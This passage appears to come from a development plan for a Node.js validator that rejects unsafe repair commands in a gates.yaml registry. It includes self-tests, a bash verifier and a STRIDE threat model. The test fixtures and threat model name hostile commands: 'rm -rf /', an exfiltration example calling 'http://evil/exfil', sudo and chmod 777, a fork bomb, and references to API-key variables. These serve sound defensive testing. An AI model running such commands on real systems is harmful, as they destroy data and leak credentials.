    if (typeof row.gate === 'string') gateName = row.gate;
    if (!gateName && typeof row.evidence_path === 'string') {
      const m = row.evidence_path.match(/gate=([A-Za-z0-9_-]+)/);
      if (m) gateName = m[1];
      else if (/commit-reviews\.jsonl$/.test(row.evidence_path)) gateName = 'per-dispatch-ATC';
      else if (/ATC-REVIEW\.md$/.test(row.evidence_path)) gateName = 'phase-level-ATC';
      else if (/WASTE\.md$/.test(row.evidence_path)) gateName = 'MUDA-waste-audit';
    }
    if (!gateName) return '';
    const yamlLibPath = path.resolve(
      __dirname, '..', '..', 'tools', 'plan-schema', 'node_modules', 'js-yaml'
    );
    const yaml = require(yamlLibPath);
    const raw = fs.readFileSync(gatesYamlPath, 'utf8');
    const parsed = yaml.load(raw);
    const gates = (parsed && Array.isArray(parsed.gates)) ? parsed.gates : [];
    const g = gates.find((x) => x && x.name === gateName);
    if (!g || typeof g.repair_instruction !== 'string') return '';
    return g.repair_instruction;
  } catch (e) {
    console.warn('[SGSD] repair-command-checker repairInstructionForBacklogRow failed:', e.message);
    return '';
  }
}

// ----------------------------------------------------------------------------
// unresolvedRepairsForMilestone(planningDir, milestone, gatesYamlPath)
// Used by sgsd-complete-milestone Step 6. Joins crit-backlog rows for the
// milestone to gates.yaml repair_instruction. Public API; never throws.
// ----------------------------------------------------------------------------
function unresolvedRepairsForMilestone(planningDir, milestone, gatesYamlPath) {
  try {
    const cb = require('./crit-backlog.cjs');
    const rows = (typeof cb.rowsForMilestone === 'function')
      ? cb.rowsForMilestone(planningDir, milestone)
      : [];
    const out = [];
    for (const r of rows) {
      if (r && r.kind === 'cleared') continue;
      const text = repairInstructionForBacklogRow(r, gatesYamlPath);
      out.push({
        backlog_id: r.id || null,
        gate: r.gate || null,
        summary: (r.summary || '').slice(0, 120),
        repair_instruction: text || '',
      });
    }
    return out;
  } catch (e) {
    console.warn('[SGSD] repair-command-checker unresolvedRepairsForMilestone failed:', e.message);
    return [];
  }
}

// ----------------------------------------------------------------------------
// --self-test (14 assertions + fingerprint guard).
// ----------------------------------------------------------------------------
function selfTest() {
  let pass = 0, fail = 0;
  const failures = [];
  const assert = (name, cond, detail) => {
    if (cond) { pass++; }
    else { fail++; failures.push({ name, detail: detail || '' }); }
  };

  // Fingerprint guard: canonical gates.yaml mtime/size unchanged.
  // Anchor to __dirname (lib lives at <repo>/super-gsd/scripts/lib/...; canonical
  // gates.yaml at <repo>/super-gsd/registry/gates.yaml -- 2 dirs up + registry).
  const realGates = path.resolve(__dirname, '..', '..', 'registry', 'gates.yaml');
  const realExistedBefore = fs.existsSync(realGates);
  const realMtimeBefore = realExistedBefore ? fs.statSync(realGates).mtimeMs : 0;
  const realSizeBefore = realExistedBefore ? fs.statSync(realGates).size : 0;

  // 1. PREDICATES is exactly the 4-AND set.
  assert('1. PREDICATES is frozen [deterministic, safe, local, auth-free]',
    Array.isArray(PREDICATES) && PREDICATES.length === 4 &&
    PREDICATES[0] === 'deterministic' && PREDICATES[1] === 'safe' &&
    PREDICATES[2] === 'local' && PREDICATES[3] === 'auth-free' &&
    Object.isFrozen(PREDICATES));

  // 2. DENYLISTS has 4 keys, each non-empty array of RegExp.
  assert('2. DENYLISTS has 4 keys each non-empty RegExp[]',
    DENYLISTS && Object.keys(DENYLISTS).length === 4 &&
    Object.keys(DENYLISTS).every((k) =>
      Array.isArray(DENYLISTS[k]) && DENYLISTS[k].length > 0 &&
      DENYLISTS[k].every((r) => r instanceof RegExp)));

  // 3. Positive control: ROADMAP-locked accept fixture.
  const r3 = validateOneCommand('node super-gsd/tools/system-map/generate.cjs');
  assert('3. node ./tools/system-map/generate.cjs accepted',
    r3.ok === true && r3.failed_predicates.length === 0,
    JSON.stringify(r3));

  // 4. Negative control: ROADMAP-locked reject fixture.
  const r4 = validateOneCommand('rm -rf /');
  assert('4. rm -rf / rejected; failed_predicates includes safe',
    r4.ok === false && r4.failed_predicates.includes('safe'),
    JSON.stringify(r4));

  // 5. Network reject (curl).
  const r5 = validateOneCommand('curl https://example.com/x');
  assert('5. curl rejected; failed_predicates includes local',
    r5.ok === false && r5.failed_predicates.includes('local'),
    JSON.stringify(r5));

  // 6. Auth reject.
  const r6 = validateOneCommand('gh auth login');
  assert('6. gh auth login rejected; failed_predicates includes auth-free',
    r6.ok === false && r6.failed_predicates.includes('auth-free'),
    JSON.stringify(r6));

  // 7. Compound reject: npm install --force => safe (--force, npm install) + local (npm install).
  const r7 = validateOneCommand('npm install --force');
  assert('7. npm install --force rejected; failed_predicates includes safe AND local',
    r7.ok === false && r7.failed_predicates.includes('safe') && r7.failed_predicates.includes('local'),
    JSON.stringify(r7));

  // 8. Non-determinism reject.
  const r8 = validateOneCommand('date +%s');
  assert('8. date +%s rejected; failed_predicates includes deterministic',
    r8.ok === false && r8.failed_predicates.includes('deterministic'),
    JSON.stringify(r8));

  // 9. validateRepairCommands single-violation shape.
  const r9 = validateRepairCommands({ gates: [{ name: 'g1', repair_command: 'rm -rf /' }] });
  assert('9. validateRepairCommands fixture: 1 violation, gate=g1',
    r9.ok === false && r9.total_violations === 1 &&
    r9.violations[0].gate === 'g1' &&
    r9.violations[0].failed_predicates.includes('safe'),
    JSON.stringify(r9));

  // 10. No command = no check.
  const r10 = validateRepairCommands({ gates: [{ name: 'g1' }] });
  assert('10. gate without repair_command -> ok:true, 0 checked',
    r10.ok === true && r10.total_commands_checked === 0,
    JSON.stringify(r10));

  // 11. Instruction-only is fine (no command means no validation).
  const r11 = validateRepairCommands({ gates: [{ name: 'g1', repair_instruction: 'fix it' }] });
  assert('11. instruction-only gate ok',
    r11.ok === true && r11.total_violations === 0,
    JSON.stringify(r11));

  // 12. assertEveryBlockingGateHasInstruction missing case.
  const r12 = assertEveryBlockingGateHasInstruction({
    gates: [{ name: 'g1', enforcement_mode: 'hard-halt' }],
  });
  assert('12. blocking gate w/o instruction -> ok:false, missing:[g1]',
    r12.ok === false && r12.missing.length === 1 && r12.missing[0] === 'g1',
    JSON.stringify(r12));

  // 13. assertEveryBlockingGateHasInstruction satisfied case.
  const r13 = assertEveryBlockingGateHasInstruction({
    gates: [{ name: 'g1', enforcement_mode: 'hard-halt', repair_instruction: 'do x' }],
  });
  assert('13. blocking gate w/ instruction -> ok:true',
    r13.ok === true && r13.missing.length === 0,
    JSON.stringify(r13));

  // 14. Live check: canonical gates.yaml passes its own validator.
  let r14 = null;
  try { r14 = validateGatesYaml(realGates); } catch (e) { r14 = { ok: false, error: e.message }; }
  assert('14. canonical gates.yaml passes validateRepairCommands',
    r14 && r14.ok === true,
    JSON.stringify(r14));

  // Fingerprint guard (post-test): canonical gates.yaml untouched.
  const realExistedAfter = fs.existsSync(realGates);
  const realMtimeAfter = realExistedAfter ? fs.statSync(realGates).mtimeMs : 0;
  const realSizeAfter = realExistedAfter ? fs.statSync(realGates).size : 0;
  const fingerprintOk =
    realExistedBefore === realExistedAfter &&
    realMtimeBefore === realMtimeAfter &&
    realSizeBefore === realSizeAfter;
  if (!fingerprintOk) {
    fail++;
    failures.push({
      name: 'FINGERPRINT GUARD: canonical gates.yaml untouched',
      detail: `existed before=${realExistedBefore} after=${realExistedAfter}; mtimeBefore=${realMtimeBefore} mtimeAfter=${realMtimeAfter}; sizeBefore=${realSizeBefore} sizeAfter=${realSizeAfter}`,
    });
  }

  console.log(`repair-command-checker self-test: ${pass} pass, ${fail} fail`);
  if (fail > 0) {
    for (const f of failures) console.error(`  FAIL: ${f.name}${f.detail ? ' -- ' + f.detail : ''}`);
    return 1;
  }
  return 0;
}

// ----------------------------------------------------------------------------
// Main
// ----------------------------------------------------------------------------
if (require.main === module) {
  const cmd = process.argv[2];
  if (cmd === '--self-test') process.exit(selfTest());
  if (cmd === '--validate') {
    const target = path.resolve(
      __dirname, '..', '..', 'registry', 'gates.yaml'
    );
    let res;
    try { res = validateGatesYaml(target); }
    catch (e) { console.error('[SGSD] --validate read/parse failed:', e.message); process.exit(1); }
    if (!res.ok) {
      console.error('[SGSD] --validate FAILED:');
      for (const v of res.violations) console.error(`  ${v.message}`);
      process.exit(1);
    }
    console.log(`[SGSD] --validate PASS: ${res.total_commands_checked} commands checked, 0 violations.`);
    process.exit(0);
  }
  if (cmd === '--validate-file') {
    const target = process.argv[3];
    if (!target) { console.error('Usage: --validate-file <path>'); process.exit(2); }
    const res = validateGatesYaml(target);
    if (!res.ok) {
      for (const v of res.violations) console.error(v.message);
      process.exit(1);
    }
    console.log(`PASS: ${res.total_commands_checked} commands checked.`);
    process.exit(0);
  }
  console.log('Usage:');
  console.log('  node repair-command-checker.cjs --self-test');
  console.log('  node repair-command-checker.cjs --validate');
  console.log('  node repair-command-checker.cjs --validate-file <path>');
  console.log('PREDICATES =', JSON.stringify(PREDICATES));
  process.exit(0);
}

module.exports = {
  PREDICATES,
  DENYLISTS,
  validateOneCommand,
  validateRepairCommands,
  validateGatesYaml,
  assertEveryBlockingGateHasInstruction,
  repairInstructionForBacklogRow,
  unresolvedRepairsForMilestone,
  selfTest,
};
```

Constraints:
- ASCII only.
- LF line endings.
- No new dependencies. Reuse js-yaml at `super-gsd/tools/plan-schema/node_modules/js-yaml` via the same `path.resolve(__dirname, '..', '..', 'tools', 'plan-schema', 'node_modules', 'js-yaml')` pattern as `gates-registry.cjs:42-44`.
- Mirror `route-ledger.cjs` shape 1:1: frozen consts, --self-test branch, assert harness, fingerprint guard, public API never throws upward.
- Self-test fingerprint guard MUST anchor to `__dirname`, not `process.cwd()` (per RESEARCH 5.5 / route-ledger.cjs:295-300).
  </action>
  <verify>
    <automated>node super-gsd/scripts/lib/repair-command-checker.cjs --self-test</automated>
  </verify>
  <done>
    - File exists at `super-gsd/scripts/lib/repair-command-checker.cjs`
    - `node super-gsd/scripts/lib/repair-command-checker.cjs --self-test` exits 0 with "14 pass, 0 fail"
    - All 9 module exports present (PREDICATES, DENYLISTS, validateOneCommand, validateRepairCommands, validateGatesYaml, assertEveryBlockingGateHasInstruction, repairInstructionForBacklogRow, unresolvedRepairsForMilestone, selfTest)
    - File total LOC between 250 and 320 (target ~280)
    - Public API never throws (verified by self-test path that wraps validateGatesYaml in try/catch in assertion 14)
  </done>
</task>

<!-- ===================================================================== -->
<!-- T4: Wire load-time validateRepairCommands into gates-registry.cjs    -->
<!-- ===================================================================== -->

<task type="auto" tdd="false">
  <name>T4: Wire validateRepairCommands into gates-registry.cjs::loadGates at line 53</name>
  <files>super-gsd/scripts/lib/gates-registry.cjs</files>
  <behavior>
    - On every successful gates.yaml load, validateRepairCommands runs and a violation throws
    - The thrown error's message contains '4-AND' AND the offending gate name AND the failed predicate
    - The instruction-presence check is informational (console.warn, not throw)
    - Existing behavior preserved: the cache-once contract, getGate, shouldFire, resetCache all unchanged
    - resetCache + reload of canonical gates.yaml succeeds (no false positives)
  </behavior>
  <action>
Edit `super-gsd/scripts/lib/gates-registry.cjs`. Replace lines 53-54
(currently `_cache = { all, byName };` followed by `return _cache;`)
with the following expanded block:

Find this existing block (lines 49-55):
```javascript
  const all = (parsed && Array.isArray(parsed.gates)) ? parsed.gates : [];
  const byName = {};
  for (const g of all) byName[g.name] = g;

  _cache = { all, byName };
  return _cache;
}
```

Replace with:
```javascript
  const all = (parsed && Array.isArray(parsed.gates)) ? parsed.gates : [];
  const byName = {};
  for (const g of all) byName[g.name] = g;

  _cache = { all, byName };

  // REPAIR-03 (Phase 33): validate every repair_command at LOAD time.
  // On 4-AND violation, throw -- gates.yaml is malformed and the
  // orchestrator must NEVER start with a poisoned registry.
  const repairChecker = require('./repair-command-checker.cjs');
  const result = repairChecker.validateRepairCommands({ gates: all });
  if (!result.ok) {
    const detail = result.violations.map((v) => v.message).join('; ');
    _cache = null; // invalidate so a fix + reload is not blocked by stale cache
    throw new Error(`gates.yaml repair_command 4-AND violations: ${detail}`);
  }

  // REPAIR-01 (Phase 33): instruction-presence is a soft-warn at load
  // time (the hard check is `grep -c repair_instruction:` >= 13 in CI).
  const presence = repairChecker.assertEveryBlockingGateHasInstruction({ gates: all });
  if (!presence.ok) {
    console.warn(`[SGSD] gates.yaml: missing repair_instruction on blocking gate(s): ${presence.missing.join(', ')}`);
  }

  return _cache;
}
```

Constraints:
- ASCII only.
- LF line endings.
- Do NOT modify `getGate`, `shouldFire`, `resetCache`, or the module.exports list.
- Do NOT change the `_cache` early-return at line 39 (the cache-once contract remains).
- The `_cache = null;` reset on violation matters: without it, a developer who fixes gates.yaml and calls `resetCache()` then `loadGates()` would get a stale value because `_cache` was assigned BEFORE the throw. We invalidate so fix + retry works.
- Production caller path: any orchestrator dispatch that calls `getGate(...)` triggers `loadGates(...)` triggers the new validation. This is the consumer side of REPAIR-03.
  </action>
  <verify>
    <automated>node -e "const fs=require('fs'),path=require('path'),os=require('os'); const tmp=fs.mkdtempSync(path.join(os.tmpdir(),'gr-')); fs.writeFileSync(path.join(tmp,'g.yaml'),'gates:\n  - name: bad\n    enforcement_mode: hard-halt\n    repair_instruction: \"text\"\n    repair_command: \"rm -rf /\"\n'); const gr=require('./super-gsd/scripts/lib/gates-registry.cjs'); gr.resetCache(); let threw=false,msg=''; try{gr.loadGates(path.join(tmp,'g.yaml'));}catch(e){threw=/4-AND/.test(e.message)&&/bad/.test(e.message)&&/safe/.test(e.message); msg=e.message;} fs.rmSync(tmp,{recursive:true,force:true}); if(!threw){console.error('FAIL: poisoned yaml did not throw structured 4-AND error. Got:',msg); process.exit(1);} gr.resetCache(); try{gr.loadGates('super-gsd/registry/gates.yaml');}catch(e){console.error('FAIL: canonical gates.yaml threw:',e.message); process.exit(1);} console.log('PASS T4: poisoned throws, canonical loads');"</automated>
  </verify>
  <done>
    - Poisoned fixture (`repair_command: "rm -rf /"`) causes loadGates to throw with message containing '4-AND' AND gate name AND 'safe'
    - Canonical `super-gsd/registry/gates.yaml` (post-T1+T2) loads without error
    - `node super-gsd/scripts/lib/repair-command-checker.cjs --self-test` still passes (assertion 14)
    - Existing call sites (`getGate`, `shouldFire`) function unchanged on canonical yaml
  </done>
</task>

<!-- ===================================================================== -->
<!-- T5: Mission Strip Q4 surfaces repair_instruction (REPAIR-04 part a)  -->
<!-- ===================================================================== -->

<task type="auto" tdd="false">
  <name>T5: Extend Mission Strip Q4 to surface repair_instruction text</name>
  <files>super-gsd/scripts/lib/sgsd-mission-strip.ps1</files>
  <behavior>
    - When a fired gate is referenced by a CRIT-BACKLOG row for the active phase, Q4 line shows '| repair: <text>' suffix
    - When no such row exists, Q4 line shows existing 'blocker active 0 open : --' format unchanged
    - The 6-line Mission Strip contract is preserved (no 7th line)
    - Read-only: no schema change to crit-backlog.jsonl
  </behavior>
  <action>
Edit `super-gsd/scripts/lib/sgsd-mission-strip.ps1`. Two changes inside
the Q4 block at lines 251-284:

CHANGE 1 -- replace line 259 (the `$nodeExpr` assignment) to include the
repair-command-checker helper for repair_instruction lookup.

Find the existing line 259:
```powershell
                $nodeExpr = "const m=require('$($cjsPath -replace '\\','/')'); const rows=m.rowsForPhase('$(($ProjectDir -replace '\\','/'))/.planning', '$($out.activePhase)'); console.log(JSON.stringify({n:rows.length, first: (rows[0] && rows[0].summary) || ''}));"
```

Replace with:
```powershell
                $rcPath = (Join-Path $ProjectDir "super-gsd/scripts/lib/repair-command-checker.cjs") -replace '\\','/'
                $gatesPath = (Join-Path $ProjectDir "super-gsd/registry/gates.yaml") -replace '\\','/'
                $nodeExpr = "const m=require('$($cjsPath -replace '\\','/')'); const rc=require('$rcPath'); const rows=m.rowsForPhase('$(($ProjectDir -replace '\\','/'))/.planning', '$($out.activePhase)'); const r=rows[0]; const repair = r ? rc.repairInstructionForBacklogRow(r,'$gatesPath') : ''; console.log(JSON.stringify({n:rows.length, first: (r && r.summary) || '', repair}));"
```

CHANGE 2 -- extend line 270 (the blocker line construction) to append
the repair text suffix when present.

Find the existing line 270:
```powershell
                            $firstShort = _Truncate-Ascii $first 50
                            $out.blocker = "> blocker blocked  $n open : $firstShort"
```

Replace with:
```powershell
                            $firstShort = _Truncate-Ascii $first 50
                            $repairText = ""
                            if ($bl.PSObject.Properties.Name -contains 'repair' -and $bl.repair) {
                                $repairShort = _Truncate-Ascii "$($bl.repair)" 60
                                $repairText = " | repair: $repairShort"
                            }
                            $out.blocker = "> blocker blocked  $n open : $firstShort$repairText"
```

Constraints:
- ASCII only.
- CRLF line endings (PowerShell file convention; match existing file).
- No 7th line. The 6-line cockpit contract is preserved (per DISCUSS 28.2).
- The PSObject property check guards against older node-out shapes that lack the `repair` field.
- Truncation at 60 chars keeps the cockpit line within terminal width.
- The existing `try { ... } catch {}` outer wrap absorbs any node failure (the strip degrades to the existing behavior on error).
  </action>
  <verify>
    <automated>powershell.exe -NoProfile -Command "$content = Get-Content -Raw super-gsd/scripts/lib/sgsd-mission-strip.ps1; if ($content -notmatch 'repair-command-checker.cjs') { Write-Error 'FAIL: rcPath insertion missing'; exit 1 }; if ($content -notmatch 'repairInstructionForBacklogRow') { Write-Error 'FAIL: helper call missing'; exit 1 }; if ($content -notmatch '\| repair: \$repairShort') { Write-Error 'FAIL: blocker suffix missing'; exit 1 }; Write-Host 'PASS T5: Mission Strip Q4 extended'"</automated>
  </verify>
  <done>
    - File contains `repair-command-checker.cjs` reference in the Q4 block
    - File contains `repairInstructionForBacklogRow` invocation
    - File contains `| repair: $repairShort` in the blocker line construction
    - Mission Strip remains 6 lines (no 7th line added)
    - Existing fall-through path (`> blocker active  0 open : --`) unchanged when no repair field present
  </done>
</task>

<!-- ===================================================================== -->
<!-- T6: Milestone-close SUMMARY enumerates Unresolved Repairs (REPAIR-04 b) -->
<!-- ===================================================================== -->

<task type="auto" tdd="false">
  <name>T6: Extend sgsd-complete-milestone Step 6 to enumerate Unresolved Repairs</name>
  <files>super-gsd/skills/sgsd-complete-milestone/SKILL.md</files>
  <behavior>
    - Step 6 SUMMARY template includes a new bullet referencing Unresolved Repairs
    - The template appends a `## Unresolved Repairs` section emitted under SUMMARY.md
    - When no unresolved repairs exist for the milestone, the section reads `(no unresolved repairs for this milestone)`
    - Otherwise lists rows with backlog id, gate, summary, repair_instruction
    - The implementation detail cites `repair-command-checker.cjs::unresolvedRepairsForMilestone`
  </behavior>
  <action>
Edit `super-gsd/skills/sgsd-complete-milestone/SKILL.md`. Locate the
existing `<step_6_summary>` block (lines 103-114). Replace the bullet
list and append the new section template.

Find this existing block (lines 103-114):
```markdown
<step_6_summary>
## Step 6: Generate SUMMARY.md

Write `.planning/milestones/{{version}}/SUMMARY.md` with:

- frontmatter including `milestone`, `status`, `vtp_classification_used`, `vtp_research_id`
- shipped phases
- evidence produced this milestone
- rules learned this session
- governance findings
- next-milestone seed
</step_6_summary>
```

Replace with:
```markdown
<step_6_summary>
## Step 6: Generate SUMMARY.md

Write `.planning/milestones/{{version}}/SUMMARY.md` with:

- frontmatter including `milestone`, `status`, `vtp_classification_used`, `vtp_research_id`
- shipped phases
- evidence produced this milestone
- rules learned this session
- governance findings
- next-milestone seed
- **Unresolved Repairs** (REPAIR-04, Phase 33): enumerate any gates with
  unresolved `repair_instruction:` text whose CRIT-BACKLOG rows are
  tagged for `{{version}}` and not yet `kind: cleared`.

### Unresolved Repairs section template

Generate this section by calling
`super-gsd/scripts/lib/repair-command-checker.cjs::unresolvedRepairsForMilestone(planningDir, '{{version}}', gatesYamlPath)`
and rendering the returned rows as a markdown table:

```markdown
## Unresolved Repairs

| backlog id | gate | summary | repair_instruction |
|---|---|---|---|
| <id> | <gate name> | <truncated summary> | <repair_instruction> |
```

If the helper returns an empty array, write the literal line:
`(no unresolved repairs for this milestone)`.

This converts open repair contracts into explicit accountable backlog
visible at milestone close, instead of silent debt that leaks into the
next milestone.
</step_6_summary>
```

Constraints:
- ASCII only.
- LF line endings (match existing SKILL.md convention).
- Preserve the `<step_6_summary>` open/close tags.
- The other `<step_*>` blocks (5, 7, etc.) MUST remain untouched.
- The new bullet MUST be the 7th item in the bullet list (after `next-milestone seed`).
- The helper name `unresolvedRepairsForMilestone` MUST match T3's exported function name byte-for-byte.
  </action>
  <verify>
    <automated>node -e "const fs=require('fs'); const t=fs.readFileSync('super-gsd/skills/sgsd-complete-milestone/SKILL.md','utf8'); const checks=[/Unresolved Repairs/.test(t), /unresolvedRepairsForMilestone/.test(t), /no unresolved repairs for this milestone/.test(t), /<step_6_summary>/.test(t), /<\/step_6_summary>/.test(t)]; if(!checks.every(Boolean)){console.error('FAIL T6: missing checks',checks); process.exit(1);} console.log('PASS T6: SUMMARY template extended');"</automated>
  </verify>
  <done>
    - SKILL.md contains `## Unresolved Repairs` section template
    - SKILL.md cites `unresolvedRepairsForMilestone` helper
    - The empty-state literal `(no unresolved repairs for this milestone)` is preserved
    - The `<step_6_summary>` block boundary tags remain intact
    - No other Step blocks modified
  </done>
</task>

<!-- ===================================================================== -->
<!-- T7: Embedded verifier -- runnable acceptance for REPAIR-01..04        -->
<!-- ===================================================================== -->

<task type="auto" tdd="false">
  <name>T7: Run the verifier (REPAIR-01..04 runnable acceptance) and capture results</name>
  <files>super-gsd/scripts/lib/repair-command-checker.cjs</files>
  <behavior>
    - REPAIR-01: gates.yaml has >=13 repair_instruction rows (T1 confirmed)
    - REPAIR-02: exactly 2 gates carry repair_command, both 4-AND-compliant
    - REPAIR-03: --self-test exits 0; poisoned fixture rejected; canonical accepted; gates-registry load throws on poisoned yaml
    - REPAIR-04: SKILL.md contains Unresolved Repairs section template; Mission Strip references repair-command-checker
    - All 4 checks emit `PASS REPAIR-NN` to stdout; the verifier exits 0
  </behavior>
  <action>
T7 is the verifier task. It does NOT modify code beyond what T1-T6 produced.
Run the embedded verifier below and capture stdout to
`.planning/milestones/v1.7/phases/33-repair-instruction/33-VERIFICATION.md`.

The verifier is a single bash block. The executor runs it via `bg_shell run`
on the persistent shell, captures stdout+stderr, and writes both into the
VERIFICATION.md.

```bash
set -e

echo "=== Phase 33 verifier (REPAIR-01..04) ==="

# REPAIR-01: all 13 gates carry repair_instruction.
COUNT_INST=$(grep -c '^    repair_instruction:' super-gsd/registry/gates.yaml || true)
if [ "$COUNT_INST" -lt 13 ]; then
  echo "FAIL REPAIR-01: expected >=13 repair_instruction rows, got $COUNT_INST"
  exit 1
fi
echo "PASS REPAIR-01: $COUNT_INST repair_instruction rows"

# REPAIR-02: exactly 2 gates carry repair_command, and validateRepairCommands
# accepts the canonical gates.yaml.
COUNT_CMD=$(grep -c '^    repair_command:' super-gsd/registry/gates.yaml || true)
if [ "$COUNT_CMD" -ne 2 ]; then
  echo "FAIL REPAIR-02: expected exactly 2 repair_command rows (after A2 demotion), got $COUNT_CMD"
  exit 1
fi

node -e "
  const c = require('./super-gsd/scripts/lib/repair-command-checker.cjs');
  const r = c.validateGatesYaml('super-gsd/registry/gates.yaml');
  if (!r.ok) {
    console.error('FAIL REPAIR-02: validateGatesYaml violations:', JSON.stringify(r.violations, null, 2));
    process.exit(1);
  }
  console.log('PASS REPAIR-02: ' + r.total_commands_checked + ' commands checked, 0 violations');
"

# REPAIR-03 (a): --self-test passes (14 assertions + fingerprint guard).
node super-gsd/scripts/lib/repair-command-checker.cjs --self-test

# REPAIR-03 (b): load-time gate-registry throws on poisoned fixture.
node -e "
  const fs = require('fs'), path = require('path'), os = require('os');
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'r3-'));
  fs.writeFileSync(
    path.join(tmp, 'g.yaml'),
    'gates:\n  - name: bad\n    enforcement_mode: hard-halt\n    repair_instruction: \"x\"\n    repair_command: \"rm -rf /\"\n'
  );
  const gr = require('./super-gsd/scripts/lib/gates-registry.cjs');
  gr.resetCache();
  let threw = false, msg = '';
  try { gr.loadGates(path.join(tmp, 'g.yaml')); }
  catch (e) { threw = /4-AND/.test(e.message) && /bad/.test(e.message); msg = e.message; }
  fs.rmSync(tmp, { recursive: true, force: true });
  if (!threw) { console.error('FAIL REPAIR-03 (b): expected throw with 4-AND + gate=bad. Got:', msg); process.exit(1); }
  console.log('PASS REPAIR-03 (b): poisoned gates.yaml load throws');
"

# REPAIR-03 (c): canonical gates.yaml loads cleanly.
node -e "
  const gr = require('./super-gsd/scripts/lib/gates-registry.cjs');
  gr.resetCache();
  try { gr.loadGates('super-gsd/registry/gates.yaml'); }
  catch (e) { console.error('FAIL REPAIR-03 (c): canonical load threw:', e.message); process.exit(1); }
  console.log('PASS REPAIR-03 (c): canonical gates.yaml loads');
"

# REPAIR-04 (a): Mission Strip references repair-command-checker.
if ! grep -q 'repair-command-checker.cjs' super-gsd/scripts/lib/sgsd-mission-strip.ps1; then
  echo "FAIL REPAIR-04 (a): Mission Strip does not reference repair-command-checker.cjs"
  exit 1
fi
echo "PASS REPAIR-04 (a): Mission Strip Q4 surfacing wired"

# REPAIR-04 (b): milestone-close SUMMARY template extended.
if ! grep -q 'Unresolved Repairs' super-gsd/skills/sgsd-complete-milestone/SKILL.md; then
  echo "FAIL REPAIR-04 (b): SKILL.md missing Unresolved Repairs section"
  exit 1
fi
if ! grep -q 'unresolvedRepairsForMilestone' super-gsd/skills/sgsd-complete-milestone/SKILL.md; then
  echo "FAIL REPAIR-04 (b): SKILL.md does not cite helper unresolvedRepairsForMilestone"
  exit 1
fi
echo "PASS REPAIR-04 (b): milestone-close SUMMARY template extended"

# Final: ROADMAP-locked positive/negative fixture pair.
node -e "
  const c = require('./super-gsd/scripts/lib/repair-command-checker.cjs');
  const accept = c.validateOneCommand('node super-gsd/tools/system-map/generate.cjs');
  if (!accept.ok) { console.error('FAIL final: system-map fixture should be accepted:', JSON.stringify(accept)); process.exit(1); }
  const reject = c.validateOneCommand('rm -rf /');
  if (reject.ok)  { console.error('FAIL final: rm -rf / fixture should be rejected'); process.exit(1); }
  console.log('PASS final: ROADMAP-locked fixture pair behaves correctly');
"

echo "=== ALL REPAIR-01..04 PASS ==="
```

Live-or-local: this verifier runs entirely against the real
`super-gsd/registry/gates.yaml` (the production caller path) plus a
single tmpdir fixture for the poison-yaml load test. No external
dependencies. No network. No auth.

Capture the verifier output and write it to:
`.planning/milestones/v1.7/phases/33-repair-instruction/33-VERIFICATION.md`

The VERIFICATION.md should include:
1. Frontmatter: `phase: 33`, `status: PASS`, `verified: <ISO ts>`
2. The full verifier stdout (each PASS line)
3. A short prose paragraph noting the A2 demotion of sgsd-recall-queries
   and token-log to instruction-only, with the specific evidence
   (sgsd-recall.sh has no --self-test/--dry-run flag; tools/token-audit/
   does not exist). This paragraph closes the loop: the contract still
   ships, just for 2 gates instead of 4 -- and the schema accepts the
   field on any future row, so v1.8+ can lift them back in cheaply.
  </action>
  <verify>
    <automated>bash -lc "set -e && grep -c '^    repair_instruction:' super-gsd/registry/gates.yaml | awk '{ if(\$1<13) exit 1 }' && grep -c '^    repair_command:' super-gsd/registry/gates.yaml | awk '{ if(\$1!=2) exit 1 }' && node super-gsd/scripts/lib/repair-command-checker.cjs --self-test && node super-gsd/scripts/lib/repair-command-checker.cjs --validate"</automated>
  </verify>
  <done>
    - All 4 acceptance checks (REPAIR-01..04) emit PASS lines
    - `node ... --self-test` exits 0
    - `node ... --validate` exits 0
    - `33-VERIFICATION.md` written with frontmatter + verifier output + A2-demotion paragraph
    - Verifier exits 0 overall
  </done>
</task>

</tasks>

<threat_model>
## Trust Boundaries

| Boundary | Description |
|----------|-------------|
| operator -> gates.yaml | Untrusted edit to a config file consumed by orchestrator at startup |
| gates.yaml -> gates-registry.cjs::loadGates | Config crosses into runtime when js-yaml parses + when validateRepairCommands runs |
| repair-command-checker -> regex deny-lists | The string `repair_command:` is the input; deny-lists are the validation surface |

## STRIDE Threat Register

| Threat ID | Category | Component | Disposition | Mitigation Plan |
|-----------|----------|-----------|-------------|-----------------|
| T-33-01 | Tampering | gates.yaml `repair_command:` value (e.g. `; curl http://evil/exfil`) | mitigate | `local` deny-list rejects curl/wget/URLs; `safe` deny-list rejects shell metacharacter abuse via redirect/sudo patterns; load-time throw at gates-registry.cjs:53 prevents orchestrator startup with poisoned config |
| T-33-02 | Elevation of Privilege | gates.yaml `repair_command: "sudo ..."` or `chmod 777 ...` | mitigate | `safe` deny-list catches `\bsudo\b` and `chmod\s+(?:777|\+x\s+\/)`; load-time throw |
| T-33-03 | Information Disclosure | `repair_command` references `$OPENAI_API_KEY` etc. and ends up in mission-strip log | mitigate | `auth-free` deny-list catches env-var refs (`\$OPENAI_API_KEY`, `\$GH_TOKEN`, etc.) BEFORE the command is rendered; rejected commands never reach the log line |
| T-33-04 | Denial of Service | `repair_command: "rm -rf /"` or fork bomb | mitigate | `safe` deny-list catches `rm -rf` and fork-bomb pattern (`:\(\)\s*\{\s*:\|`); load-time throw |
| T-33-05 | Tampering (deterministic-window) | `repair_command: "$(date) ; rm important"` (race on timing) | mitigate | `deterministic` deny-list catches `\$\(date` AND `safe` deny-list catches `rm` => 2 predicates fail; load-time throw |
| T-33-06 | Spoofing | repair_command includes `gh auth login --token $TOKEN` to spoof identity | mitigate | `auth-free` deny-list catches `gh auth` AND `--header Authorization` patterns |
| T-33-07 | Repudiation | a fired gate's repair_instruction is silently lost between Mission Strip and milestone-close | mitigate | T6 SUMMARY enumeration creates an explicit milestone-close audit row per unresolved repair; impossible to silently drop |
| T-33-08 | Tampering (parser) | crafted yaml exploits js-yaml load (e.g. `!!js/function`) | accept | js-yaml in this repo is the SAFE_SCHEMA default for `yaml.load`; arbitrary !!js/* tags are rejected by the library; reuse of the existing pinned install means no NEW attack surface introduced by Phase 33 |
